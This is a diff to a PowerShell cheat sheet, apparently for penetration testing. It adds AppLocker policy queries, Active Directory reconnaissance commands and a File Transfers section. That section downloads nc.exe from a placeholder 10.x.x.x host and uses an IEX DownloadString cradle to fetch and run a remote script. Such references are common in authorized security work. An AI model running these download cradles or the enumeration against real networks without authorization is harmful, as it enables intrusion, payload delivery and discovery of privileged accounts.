@@ -301,21 +301,69 @@ $password = ConvertTo-SecureString 'Password1' -AsPlainText -Force
 $credentialsObject = New-Object System.Management.Automation.PSCredential($username, $password)
 ```
 
+## Applocker
+
+Get the "Effective" applocker policy:
+
+```
+Get-ApplockerPolicy -Effective | Select -expandproperty RuleCollections
+```
+
+Get the "Local" applocker policy:
+
+```
+Get-AppLockerPolicy -Local
+```
+
+Get the "Domain" applocker policy:
+
+```
+Get-AppLockerPolicy -Domain
+```
+
 ## File Transfers
 
-Coming soon...
+Download a file using "System.Net.WebClient" (DownloadFile method):
 
+```
+(New-Object System.Net.WebClient).DownloadFile('http://10.x.x.x/nc.exe','c:\windows\temp\nc.exe'
+```
 
+Download a file using "System.Net.WebClient" (DownloadString method with IEX cmdlet):
 
-
-
-
-
-
+```
+IEX (New-Object System.Net.WebClient).DownloadString('http://10.x.x.x/file.ps1')
+```
 
 ## Active Directory
 
-Coming soon...
+Commands below require the "ActiveDirectory" module to be installed:
+
+Gather domain information:
+
+```
+Get-ADDomain
+Get-DomainSID
+Get-ADDomainController
+Get-ADDomainController -Identity <DomainName>
+Get-ADTrust -Filter *
+Get-ADTrust -Identity <DomainName>
+Get-ADForest
+Get-ADForest -Identity <ForestName>
+(Get-ADForest).Domains
+Get-ADUser -Identity Administrator -Properties *
+Get-ADUser -Filter 'Name -like "*SvcAccount"' | Format-Table Name,SamAccountName -A
+Get-ADUser -LDAPFilter '(!userAccountControl:1.2.840.113556.1.4.803:=2)'
+Get-ADComputer
+Get-ADComputer -Filter *
+Get-ADComputer -Filter 'Name -like "comp*"' -Properties IPv4Address | FT Name,DNSHostName,IPv4Address -A
+Get-ADComputerServiceAccount
+Get-ADGroup
+Get-ADGroup -Identity Administrators
+Get-ADGroupMember
+Get-ADGroupMember -Identity Administrators
+Get-ADPrincipalGroupMembership -Identity Administrator
+```
 
 
 
